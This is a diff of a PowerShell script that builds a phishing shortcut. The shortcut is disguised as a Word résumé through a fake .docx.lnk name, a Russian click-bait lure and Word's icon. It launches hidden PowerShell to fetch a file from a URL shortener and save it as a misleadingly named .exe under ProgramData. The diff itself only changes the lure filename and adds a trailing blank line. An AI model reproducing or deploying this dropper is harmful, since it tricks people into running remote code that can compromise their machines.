@@ -1,6 +1,6 @@
 $url = 'https://clck.ru/<file>'
 $output = 'C:\ProgramData\Microsoft.SqlServer.C0mpact.WindowsHolographicDevices400.32.bc.exe'
-$shortcutPath = "$PWD\test.docx.lnk"
+$shortcutPath = "$PWD\Резюме бомжа для HR кликни пж.docx.lnk"
 
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
@@ -23,4 +23,5 @@ if (Test-Path $shortcutPath) { Remove-Item -Path $shortcutPath -Force }
 $Shortcut.Arguments = "/nop /noni -WindowStyle Hidden -Command `"& { $psCommand }`""
 $Shortcut.IconLocation = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0'
 $Shortcut.Save()
+
 
